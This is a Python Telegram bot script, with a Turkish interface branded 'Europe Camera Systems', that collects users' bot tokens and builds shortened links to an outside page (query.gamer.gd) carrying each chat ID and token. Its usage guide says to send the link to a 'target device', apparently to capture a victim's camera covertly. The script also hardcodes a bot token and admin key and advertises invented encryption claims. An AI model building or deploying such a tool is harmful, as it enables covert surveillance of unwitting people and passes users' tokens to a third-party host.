import time
import requests
import telebot
from telebot import types

# --- YAPILANDIRMA ---
BOT_TOKEN = "8651044736:AAEytWv2K_pnB191dgX4b0wx-esxxG9AaTQ"
ADMIN_KEY = "EUROPEDEV"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")

# Zorunlu Kanal ve Grup Bilgileri
CHANNELS = [
    {"username": "@EuropeArsiv", "link": "https://t.me/EuropeArsiv", "title": "📢 EUROPE ARŞİV KANAL"},
    {"username": "@EuropeArsivChat", "link": "https://t.me/EuropeArsivChat", "title": "💬 EUROPE ARŞİV CHAT"}
]

# Veri Depolama (Bellek İçi)
user_tokens = {}      # chat_id: token
user_states = {}      # chat_id: WAIT_TOKEN / WAIT_BAN_ID / WAIT_UNBAN_ID / WAIT_ADMIN_KEY / WAIT_BROADCAST
banned_users = set()  # banlanan user_id'ler
admin_sessions = set()# yetkilendirilmiş admin chat_id'leri
all_users = set()     # bota giren tüm kullanıcılar


# --- YARDIMCI FONKSİYONLAR ---
def check_substitutions(user_id):
    """Zorunlu kanal katılımını kontrol eder."""
    for ch in CHANNELS:
        try:
            member = bot.get_chat_member(ch["username"], user_id)
            if member.status in ["left", "kicked"]:
                return False
        except Exception as e:
            print(f"Kanal Kontrol Hatası ({ch['username']}): {e}")
            return False
    return True


def loading_animation(chat_id, message_id, text_prefix):
    """Siber yükleme efekti simülasyonu."""
    frames = [
        "░░░░░░░░░░ 0%",
        "▓▓▓░░░░░░░ 30%",
        "▓▓▓▓▓▓░░░░ 60%",
        "▓▓▓▓▓▓▓▓▓▓ 100%"
    ]
    for frame in frames:
        try:
            bot.edit_message_text(
                f"{text_prefix}\n\n⚙️ *İşleniyor...*\n`[{frame}]`",
                chat_id,
                message_id
            )
            time.sleep(0.3)
        except Exception:
            pass


# --- KLAVYELER (KEYBOARDS) ---
def join_required_keyboard():
    kb = types.InlineKeyboardMarkup(row_width=1)
    for ch in CHANNELS:
        kb.add(types.InlineKeyboardButton(f"{ch['title']} ⚡", url=ch["link"]))
    kb.add(types.InlineKeyboardButton("🔄 🟩 KATILIMLARI DOĞRULA 🟩", callback_data="check_join"))
    return kb


def main_keyboard(user_id):
    kb = types.InlineKeyboardMarkup(row_width=2)
    
    btn_create = types.InlineKeyboardButton("🎥 🟢 LINK OLUSUTUR", callback_data="create_link")
    btn_status = types.InlineKeyboardButton("📡 🟦 SISTEM DURUMU", callback_data="sys_status")
    btn_guide = types.InlineKeyboardButton("📖 🟨 KULLANIM REHBERI", callback_data="guide")
    btn_dev = types.InlineKeyboardButton("👨‍💻 🟣 GELISTIRICI", url="https://t.me/WraithVorn")
    btn_admin = types.InlineKeyboardButton("👑 🔴 ADMIN PANEL", callback_data="open_admin")

    kb.add(btn_create)
    kb.add(btn_status, btn_guide)
    kb.add(btn_dev, btn_admin)
    return kb


def admin_panel_keyboard():
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("🚫 Kullanıcı Banla", callback_data="adm_ban"),
        types.InlineKeyboardButton("✅ Ban Kaldır", callback_data="adm_unban")
    )
    kb.add(
        types.InlineKeyboardButton("📊 İstatistikler", callback_data="adm_stats"),
        types.InlineKeyboardButton("📢 Duyuru Yap", callback_data="adm_broadcast")
    )
    kb.add(types.InlineKeyboardButton("🔙 Ana Menüye Dön", callback_data="go_main"))
    return kb


# --- KOMUT HAFITALARI ---
@bot.message_handler(commands=["start"])
def start(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    firstname = message.from_user.first_name or "Kullanıcı"

    all_users.add(user_id)

    # Ban Kontrolü
    if user_id in banned_users:
        bot.send_message(
            chat_id,
            "╭───▣ ⛔ *ERİŞİM ENGELLENDİ* ⛔\n"
            "┊▎➺ 👤 *Kullanıcı*   : " + firstname + "\n"
            "┊▎➺ 🛡️ *Durum*       : ❌ Sistemden Yasaklandınız!\n"
            "┊▎➺ 📞 *Destek*      : @WraithVorn\n"
            "╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄₊˚・💫"
        )
        return

    user_states[chat_id] = "NONE"

    # Zorunlu Kanal Kontrolü
    if not check_substitutions(user_id):
        bot.send_message(
            chat_id,
            "╭───▣ 🚨 *EUROPE CAMERA SYSTEMS* 🚨\n"
            "┊▎➺ 👤 *Kullanıcı*   : " + firstname + "\n"
            "┊▎➺ 🛡️ *Durum*       : ❌ Erişim Kilitli\n"
            "┊▎➺ 📌 *Gereksinim*  : Kanallara Katılmalısınız\n"
            "┊\n"
            "┊▎📢 *Zorunlu Kanallar:*\n"
            "┊▎➺ ▫️ @EuropeArsiv\n"
            "┊▎➺ ▫️ @EuropeArsivChat\n"
            "┊\n"
            "┊▎📞 *Geliştirici*  : @WraithVorn\n"
            "╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄₊˚・💫",
            reply_markup=join_required_keyboard()
        )
        return

    bot.send_message(
        chat_id,
        "╭───▣ ⚡ *EUROPE CAMERA SYSTEMS V2.5 VIP* ⚡\n"
        "┊▎➺ 🌐 *Hoş Geldiniz* : " + firstname + "\n"
        "┊▎➺ 🚀 *Çekirdek*     : Quantum Port v9.4\n"
        "┊▎➺ 🛡️ *Tünel*        : 256-Bit SSL Encrypted\n"
        "┊▎➺ ❇️ *Sistem*       : Çevrimiçi (ONLINE)\n"
        "┊\n"
        "┊▎📌 *Ağ Bağlantıları:*\n"
        "┊▎➺ 📢 *Kanal*       : @EuropeArsiv\n"
        "┊▎➺ 💬 *Chat*        : @EuropeArsivChat\n"
        "┊▎➺ 📞 *Geliştirici*  : @WraithVorn\n"
        "╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄₊˚・💫\n\n"
        "✨ *Erişim sağlamak için aşağıdaki kontrol panelini kullanın:*",
        reply_markup=main_keyboard(user_id)
    )


# --- CALLBACK QUERY ISLEYICI ---
@bot.callback_query_handler(func=lambda c: True)
def handle_callbacks(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id

    if user_id in banned_users:
        bot.answer_callback_query(call.id, "⛔ Sistemden yasaklandınız!", show_alert=True)
        return

    # Kanal Doğrulama
    if call.data == "check_join":
        if check_substitutions(user_id):
            bot.answer_callback_query(call.id, "✅ Üyeliğiniz onaylandı! Giriş yapılıyor...", show_alert=True)
            bot.delete_message(chat_id, call.message.message_id)
            start(call.message)
        else:
            bot.answer_callback_query(call.id, "❌ Eksik katılım! Lütfen iki kanala da katılın.", show_alert=True)
        return

    if not check_substitutions(user_id):
        bot.answer_callback_query(call.id, "⚠️ Zorunlu kanallara katılmadan işlem yapamazsınız!", show_alert=True)
        return

    # Ana Menü Dönüş
    if call.data == "go_main":
        bot.delete_message(chat_id, call.message.message_id)
        start(call.message)
        return

    # Sistem Durumu Butonu
    if call.data == "sys_status":
        bot.send_message(
            chat_id,
            "╭───▣ 📡 *SİSTEM GRAFİK RAPORU*\n"
            "┊▎➺ 🟢 *Tünel Sunucusu* : Aktif (%100)\n"
            "┊▎➺ ⚡ *Ping Yanıtı*    : 14ms\n"
            "┊▎➺ 🛡️ *Güvenlik Wall*  : Ultra High\n"
            "┊▎➺ 🔄 *Port Durumu*   : Tüneller Açık\n"
            "┊\n"
            "┊▎📞 *Sorumlu*          : @WraithVorn\n"
            "╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄₊˚・💫"
        )
        return

    # Kullanım Rehberi Butonu
    if call.data == "guide":
        bot.send_message(
            chat_id,
            "╭───▣ 📖 *KULLANIM REHBERİ*\n"
            "┊▎1️⃣ *Link Oluştur* butonuna basın.\n"
            "┊▎2️⃣ Bot Father'dan aldığınız **Bot Token**'i gönderin.\n"
            "┊▎3️⃣ Sistem size özel şifreli erişim linkini üretecektir.\n"
            "┊▎4️⃣ Oluşan linki hedef cihaza iletin.\n"
            "┊\n"
            "┊▎📞 *Geliştirici* : @WraithVorn\n"
            "╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄₊˚・💫"
        )
        return

    # Link Oluşturma
    if call.data == "create_link":
        if chat_id in user_tokens:
            send_short_link(chat_id, user_tokens[chat_id])
            return

        user_states[chat_id] = "WAIT_TOKEN"
        bot.send_message(
            chat_id,
            "╭───▣ 🔑 *TOKEN ENTEGRASYON ADIMI*\n"
            "┊▎➺ ⚙️ *Aşama*        : Bot Token Girişi\n"
            "┊▎➺ 📝 *Talimat*      : Lütfen **Telegram Bot Token** gönderin\n"
            "┊\n"
            "┊▎📞 *Geliştirici*   : @WraithVorn\n"
            "╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄₊˚・💫"
        )
        return

    # Admin Paneli Açma
    if call.data == "open_admin":
        if chat_id in admin_sessions:
            open_admin_panel(chat_id)
        else:
            user_states[chat_id] = "WAIT_ADMIN_KEY"
            bot.send_message(
                chat_id,
                "╭───▣ 🔐 *ADMIN YETKİLENDİRME*\n"
                "┊▎➺ 🔑 *Aşama*  : Şifre Doğrulama\n"
                "┊▎➺ 📝 *Lütfen Admin Key (Giriş Şifresi) Giriniz:*\n"
                "┊\n"
                "┊▎📞 *Geliştirici* : @WraithVorn\n"
                "╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄₊˚・💫"
            )
        return

    # Admin Buton İşlemleri
    if chat_id in admin_sessions:
        if call.data == "adm_ban":
            user_states[chat_id] = "WAIT_BAN_ID"
            bot.send_message(chat_id, "🚫 *Yasaklanacak Kullanıcının Telegram ID'sini girin:*")
        elif call.data == "adm_unban":
            user_states[chat_id] = "WAIT_UNBAN_ID"
            bot.send_message(chat_id, "✅ *Yasağı Kaldırılacak Kullanıcının Telegram ID'sini girin:*")
        elif call.data == "adm_stats":
            bot.send_message(
                chat_id,
                "╭───▣ 📊 *SİSTEM İSTATİSTİKLERİ*\n"
                f"┊▎➺ 👥 *Toplam Kullanıcı* : {len(all_users)}\n"
                f"┊▎➺ ⛔ *Banlı Kullanıcı*  : {len(banned_users)}\n"
                f"┊▎➺ 🔑 *Kayıtlı Tokenler* : {len(user_tokens)}\n"
                "┊\n"
                "┊▎📞 *Sistem Yöneticisi*  : @WraithVorn\n"
                "╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄₊˚・💫"
            )
        elif call.data == "adm_broadcast":
            user_states[chat_id] = "WAIT_BROADCAST"
            bot.send_message(chat_id, "📢 *Tüm kullanıcılara gönderilecek duyuru mesajını yazın:*")


def open_admin_panel(chat_id):
    bot.send_message(
        chat_id,
        "╭───▣ 👑 *EUROPE ADMIN CONTROL PANEL* 👑\n"
        "┊▎➺ 🛡️ *Yetki Durumu* : Doğrulandı (FULL ACCESS)\n"
        "┊▎➺ ⚙️ *Yönetim*      : Aktif\n"
        "┊\n"
        "┊▎📞 *Geliştirici*    : @WraithVorn\n"
        "╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄₊˚・💫\n\n"
        "Aşağıdan yapmak istediğiniz yönetimsel işlemi seçin:",
        reply_markup=admin_panel_keyboard()
    )


# --- MESAJ İŞLEYİCİ ---
@bot.message_handler(func=lambda m: True)
def handle_message(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    text = message.text.strip()

    if user_id in banned_users:
        return

    state = user_states.get(chat_id, "NONE")

    # Admin Şifre Kontrolü
    if state == "WAIT_ADMIN_KEY":
        if text == ADMIN_KEY:
            admin_sessions.add(chat_id)
            user_states[chat_id] = "NONE"
            msg = bot.send_message(chat_id, "🔑 *Şifre Doğrulanıyor...*")
            loading_animation(chat_id, msg.message_id, "🌐 *YETKİ ONAYLANDI*")
            open_admin_panel(chat_id)
        else:
            user_states[chat_id] = "NONE"
            bot.send_message(chat_id, "❌ *Hatalı Admin Key! Erişim Reddedildi.*")
        return

    # Admin Ban İçi
    if state == "WAIT_BAN_ID" and chat_id in admin_sessions:
        try:
            target_id = int(text)
            banned_users.add(target_id)
            user_states[chat_id] = "NONE"
            bot.send_message(chat_id, f"🚫 `{target_id}` ID'li kullanıcı **başarıyla yasaklandı.**")
        except ValueError:
            bot.send_message(chat_id, "❌ Geçersiz ID! Sayısal bir Telegram ID girin.")
        return

    # Admin Ban Açma İçi
    if state == "WAIT_UNBAN_ID" and chat_id in admin_sessions:
        try:
            target_id = int(text)
            banned_users.discard(target_id)
            user_states[chat_id] = "NONE"
            bot.send_message(chat_id, f"✅ `{target_id}` ID'li kullanıcının **yasağı kaldırıldı.**")
        except ValueError:
            bot.send_message(chat_id, "❌ Geçersiz ID! Sayısal bir Telegram ID girin.")
        return

    # Admin Duyuru
    if state == "WAIT_BROADCAST" and chat_id in admin_sessions:
        user_states[chat_id] = "NONE"
        count = 0
        for uid in all_users:
            try:
                bot.send_message(uid, f"📢 *EUROPE SYSTEM DUYURUSU*\n\n{text}\n\n👨‍💻 @WraithVorn")
                count += 1
            except Exception:
                pass
        bot.send_message(chat_id, f"✅ Duyuru **{count}** kullanıcıya ulaştırıldı.")
        return

    # Token Doğrulama İşlemi
    if state == "WAIT_TOKEN":
        url = f"https://api.telegram.org/bot{text}/getMe"
        try:
            r = requests.get(url, timeout=10).json()
        except Exception:
            bot.send_message(chat_id, "❌ *Bağlantı Hatası:* Telegram API yanıt vermiyor.\n\nDestek: @WraithVorn")
            return

        if not r.get("ok"):
            bot.send_message(chat_id, "❌ *Geçersiz Token:* Girdiğiniz token aktif veya doğru değil.\n\nDestek: @WraithVorn")
            return

        user_tokens[chat_id] = text
        user_states[chat_id] = "NONE"

        msg = bot.send_message(chat_id, "⚡ *Token Analiz Ediliyor...*")
        loading_animation(chat_id, msg.message_id, "✅ *TOKEN ENTEGRASYONU BAŞARILI*")
        send_short_link(chat_id, text)


def send_short_link(chat_id, token):
    long_url = f"http://query.gamer.gd/C1.html?id={chat_id}&token={token}"

    try:
        short = requests.get(
            "https://clck.ru/--",
            params={"url": long_url},
            timeout=10
        ).text
    except Exception:
        bot.send_message(
            chat_id,
            "╭───▣ ❌ *SİSTEM HATASI*\n"
            "┊▎➺ Link servisine erişilemedi.\n"
            "┊▎📞 *Geliştirici* : @WraithVorn\n"
            "╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄₊˚・💫"
        )
        return

    bot.send_message(
        chat_id,
        "╭───▣ 🚀 *EUROPE CAMERA SYSTEMS - BAĞLANTI HAZIR*\n"
        "┊▎➺ 🔗 *Tünel Linki* : `" + short + "`\n"
        "┊▎➺ 🎯 *Durum*       : Bağlantı Portu Aktif\n"
        "┊▎➺ 🛡️ *Şifreleme*   : AES 256-bit Secure\n"
        "┊\n"
        "┊▎📌 *Ağ Kanalları:*\n"
        "┊▎➺ 📢 *Kanal*       : @EuropeArsiv\n"
        "┊▎➺ 💬 *Chat*        : @EuropeArsivChat\n"
        "┊\n"
        "┊▎📞 *Geliştirici*   : @WraithVorn\n"
        "╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄₊˚・💫",
        disable_web_page_preview=True
    )


print("EUROPE CAMERA SYSTEMS VIP Bot Aktif...")

# BOT POLLING DÖNGÜSÜ
while True:
    try:
        bot.polling(
            none_stop=True,
            interval=2,
            timeout=20,
            long_polling_timeout=20
        )
    except Exception as e:
        print("Bağlantı hatası, yeniden bağlanılıyor:", e)
        time.sleep(5)
